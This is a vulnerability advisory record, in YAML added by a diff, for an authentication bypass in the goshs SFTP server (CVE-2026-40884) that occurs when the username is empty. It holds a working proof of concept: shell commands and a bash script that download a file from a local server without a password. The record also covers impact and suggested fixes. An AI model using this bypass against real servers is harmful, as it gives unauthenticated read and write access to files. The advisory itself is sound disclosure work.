@@ -1,0 +1,205 @@
+advisory_id: GHSA-c29w-qq4m-2gcv
+datasource_id: github_osv/GHSA-c29w-qq4m-2gcv
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c29w-qq4m-2gcv/GHSA-c29w-qq4m-2gcv.json
+aliases:
+  - CVE-2026-40884
+summary: |
+  goshs has an empty-username SFTP password authentication bypass
+  ### Summary
+  goshs contains an SFTP authentication bypass when the documented empty-username basic-auth syntax is used. If the server is started with `-b ':pass'` together with `-sftp`, goshs accepts that configuration but does not install any SFTP password handler. As a result, an unauthenticated network attacker can connect to the SFTP service and access files without a password. I reproduced this on the latest release `v2.0.0-beta.5`.
+
+  ### Details
+  The help text explicitly documents empty usernames as valid authentication input:
+
+  - `options/options.go:264-266` says `Use basic authentication (user:pass - user can be empty)`
+
+  The SFTP sanity check only requires that either `-b` or `--sftp-keyfile` is present:
+
+  ```go
+  if opts.SFTP && (opts.BasicAuth == "" && opts.SFTPKeyFile == "") {
+      logger.Fatal("When using SFTP you need to either specify an authorized keyfile using -sfk or username and password using -b")
+  }
+  ```
+
+  That parsing logic then splits `-b ':pass'` into an empty username and a non-empty password:
+
+  ```go
+  auth := strings.SplitN(opts.BasicAuth, ":", 2)
+  opts.Username = auth[0]
+  opts.Password = auth[1]
+  ```
+
+  But the SFTP server only installs a password handler if both the username and password are non-empty:
+
+  ```go
+  if s.Username != "" && s.Password != "" {
+      sshServer.PasswordHandler = func(ctx ssh.Context, password string) bool {
+          return ctx.User() == s.Username && password == s.Password
+      }
+  }
+  ```
+
+  With `-b ':pass'`, that condition is false, so no password authentication is enforced for SFTP sessions.
+
+  Relevant source locations:
+
+  - `options/options.go:264-266`
+  - `sanity/checks.go:82-85`
+  - `sanity/checks.go:102-109`
+  - `sftpserver/sftpserver.go:82-85`
+
+  ### PoC
+  I manually verified the issue on `v2.0.0-beta.5`. The server was started with the documented empty-user auth syntax `-b ':pass'`, but an SFTP client still downloaded a file without supplying any key or password.
+
+  Manual verification commands used:
+
+  `Terminal 1`
+
+  ```bash
+  cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
+  go build -o /tmp/goshs_beta5 ./
+
+  rm -rf /tmp/goshs_authless_root /tmp/authless_sftp.txt
+  mkdir -p /tmp/goshs_authless_root
+  printf 'root file\n' > /tmp/goshs_authless_root/test.txt
+
+  /tmp/goshs_beta5 -p 18102 -sftp -d /tmp/goshs_authless_root --sftp-port 2223 -b ':pass'
+  ```
+
+  `Terminal 2`
+
+  ```bash
+  printf 'get /tmp/goshs_authless_root/test.txt /tmp/authless_sftp.txt\nbye\n' | \
+  sftp -o PreferredAuthentications=none,password -o PubkeyAuthentication=no \
+  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P 2223 -b - foo@127.0.0.1
+
+  cat /tmp/authless_sftp.txt
+  ```
+
+  Expected result:
+
+  - the SFTP session succeeds without a key
+  - there is no password prompt
+  - `cat /tmp/authless_sftp.txt` prints `root file`
+
+  PoC Video 1:
+
+  https://github.com/user-attachments/assets/1ef1539d-bf29-419b-a26e-46aa405effb4
+
+
+  Single-script verification:
+
+  ```bash
+  '/Users/r1zzg0d/Documents/CVE hunting/output/poc/gosh_poc2'
+  ```
+
+  `gosh_poc2` script content:
+
+  ```bash
+  #!/usr/bin/env bash
+  set -euo pipefail
+
+  REPO='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
+  BIN='/tmp/goshs_beta5_sftp_empty_user'
+  ROOT='/tmp/goshs_authless_root'
+  DOWNLOAD='/tmp/authless_sftp.txt'
+  HTTP_PORT='18102'
+  SFTP_PORT='2223'
+  SERVER_PID=""
+
+  cleanup() {
+    if [[ -n "${SERVER_PID:-}" ]]; then
+      kill "${SERVER_PID}" >/dev/null 2>&1 || true
+      wait "${SERVER_PID}" 2>/dev/null || true
+    fi
+  }
+  trap cleanup EXIT
+
+  echo '[1/5] Building goshs beta.5'
+  cd "${REPO}"
+  go build -o "${BIN}" ./
+
+  echo '[2/5] Preparing test root'
+  rm -rf "${ROOT}" "${DOWNLOAD}"
+  mkdir -p "${ROOT}"
+  printf 'root file\n' > "${ROOT}/test.txt"
+
+  echo "[3/5] Starting goshs with documented empty-user auth syntax on SFTP ${SFTP_PORT}"
+  "${BIN}" -p "${HTTP_PORT}" -sftp -d "${ROOT}" --sftp-port "${SFTP_PORT}" -b ':pass' \
+    >/tmp/gosh_poc2.log 2>&1 &
+  SERVER_PID=$!
+
+  for _ in $(seq 1 40); do
+    if python3 - <<PY
+  import socket
+  s = socket.socket()
+  try:
+      s.connect(("127.0.0.1", ${SFTP_PORT}))
+      raise SystemExit(0)
+  except OSError:
+      raise SystemExit(1)
+  finally:
+      s.close()
+  PY
+    then
+      break
+    fi
+    sleep 0.25
+  done
+
+  echo '[4/5] Connecting without password or key'
+  printf "get ${ROOT}/test.txt ${DOWNLOAD}\nbye\n" | \
+    sftp -o PreferredAuthentications=none,password -o PubkeyAuthentication=no \
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P "${SFTP_PORT}" -b - foo@127.0.0.1
+
+  echo '[5/5] Verifying unauthenticated file access'
+  echo "Downloaded content: $(cat "${DOWNLOAD}")"
+
+  if [[ "$(cat "${DOWNLOAD}")" == 'root file' ]]; then
+    echo '[RESULT] VULNERABLE: empty-user SFTP password auth leaves the server unauthenticated'
+  else
+    echo '[RESULT] NOT REPRODUCED'
+    exit 1
+  fi
+  ```
+
+  PoC Video 2:
+
+  https://github.com/user-attachments/assets/b8f632b7-20f4-49f1-b207-b2502af49b77
+
+
+
+  ### Impact
+  This is an authentication bypass in the SFTP service. An external attacker does not need valid credentials to access the exposed SFTP root when the operator follows the documented `-b ':pass'` syntax. That enables unauthenticated reading, uploading, renaming, and deleting of files within the configured SFTP root, depending on server mode and filesystem permissions.
+
+  ### Remediation
+  Suggested fixes:
+
+  1. Install the SFTP password handler whenever a password is configured, even if the username is an empty string.
+  2. If empty usernames are not intended for SFTP, reject `-b ':pass'` during option validation whenever `-sftp` is enabled.
+  3. Add an integration test that starts SFTP with `-b ':pass'` and verifies that unauthenticated sessions are rejected.
+impacted_packages: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-c29w-qq4m-2gcv/GHSA-c29w-qq4m-2gcv.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-306
+references:
+  - url: https://github.com/patrickhener/goshs
+    reference_type:
+    reference_id:
+  - url: https://github.com/patrickhener/goshs/security/advisories/GHSA-c29w-qq4m-2gcv
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-40884
+    reference_type:
+    reference_id:
+exploits: []
